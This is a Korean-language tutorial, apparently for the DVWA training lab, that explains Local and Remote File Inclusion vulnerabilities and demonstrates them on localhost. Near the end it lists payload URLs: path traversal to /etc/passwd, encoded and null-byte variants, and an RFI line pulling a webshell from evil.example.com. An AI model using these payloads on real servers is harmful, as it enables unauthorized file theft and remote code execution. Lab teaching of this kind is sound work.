## 파일 삽입 공격
이 도구를 이용하여 허용받지 않은 서비스 대상으로 해킹을 시도하는 행위는 범죄 행위 입니다. 
해킹을 시도할 때에 발생하는 법적인 책임은 그것을 행한 사용자에게 있다는 것을 명심하시기 바랍니다. 
File Inclusion 취약점은 웹 서버의 정보를 권한 없이 가져오거나, 공격자가 대상 서버의 URL을 통하여 공격코드를 삽입하는 공격을 말합니다.
File Inclusion 취약점은 LFI(Local File Inclusion) 와 RFI(Remote File Inclusion)로 나누어 집니다.
■ LFI(Local File Inclusion)LFI 취약점을 이용한 공격 방식은 서버 내(로컬) 파일에 접근하는 공격 방식입니다.        
예를 들어 서버 디렉토리 안에 WebShell을 업로드 한후 File Inclusion 취약점이 있는 페이지를 통해 WebShell을 실행 시킬 수 있고, 서버 내에 중요 파일까지 접근을 할수 있습니다.     
■ RFI(Local File Inclusion)RFL 취약점을 이용한 공격 방식은 공격자가 악성 스크립트 파일을 서버에 전달하여 해당 페이지를 통하여 악성스크립트를 실행하게 하는 공격 방식 입니다.      
File Inclusion 취약점은 일반적으로 $_GET, $_POST, $_Cookie 값을 전달받는 과정에서 매개변수의 값을 서버에서 제대로 검증하지 않아 발생 합니다.      
        
해당화면은 File Inclusion 취약점 진단항목의 화면이며, More Information 링크를 눌러 자세한 설명을 확인하실수 있습니다.    
Low레벨의 소스코드를 보시면 URL 매개변수에 대한 어떠한 검증도 하고 있지 않는것을 알 수 있습니다.

해당 페이지의 HTML 소스코드 입니다. 해당 코드도 마찬가지로 매개변수 값을 검증하지 않고 그대로 넘겨주는 것을 확인할 수 있습니다.      

Midium레벨의 소스코드를 확인해 보면 str_replace를 이용하여 치환을 하지만 이는 충분히 우회가 가능합니다.
해당 취약점 페이지의 URL을 확인해 보면 http://자신의 IP/vulnerabilities/fi/?page=file1.php page 변수를 통하여 페이지를 불러 들이고,
이때 page 변수 입력 값에 대한 검증이 이루어지지 않아 해당 취약점이 발생을 합니다. 취약점이 있는지 확인

URL 주소에 page=../ 이렇게만 입력을 해보면 친절하게 취약점이 있다고 설명을 해주고 있습니다.그럼 실제 File Inclusion 취약점 테스트를 진행해보도록 하겠습니다. 
테스트를 하기 전에 먼저 자신의 DVWA 폴더안에 test 파일을 하나 만들고 그안에 글씨를 써서 저장을 해놓습니다. 
       
해당 취약점 공격은 윈도우에서 테스트를 하였습니다. http://127.0.0.1/vulnerabilities/fi/?page=..\..\test.txt 저같은 경우는 test.txt 라는 파일로 만들어서 테스를 하였습니다.       
실제 공격 구문을 입력하면 test.txt 파일안에 내용이 보입니다. 만약 여기에 중요한 비밀번호나 계정정보가 들어 있다면 그 정보들을 다 유출이 될것 입니다.     
http://example.com/index.php?file=../../../../etc/passwdhttp://example.com/index.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswdhttp://example.com/index.php?file=../../../../etc/passwd%http://example.com/index.php?file=..\..\..\test.txthttp://example.com/index.php?file=C:\test.txthttp://example.com/index.php?file=http://evil.example.com/webshell.txt (RFI)          
해당 취약한 공격코드는 이것 외에도 많이 있으며, 참고만 하시기 바랍니다.절대 검증되지 않은 페이지에서는 공격 시도를 하지 마시기 바랍니다. 법적인 책임을 지실수도 있습니다.       


## More Information
Wikipedia - File inclusion vulnerability
WSTG - Local File Inclusion
WSTG - Remote File Inclusion
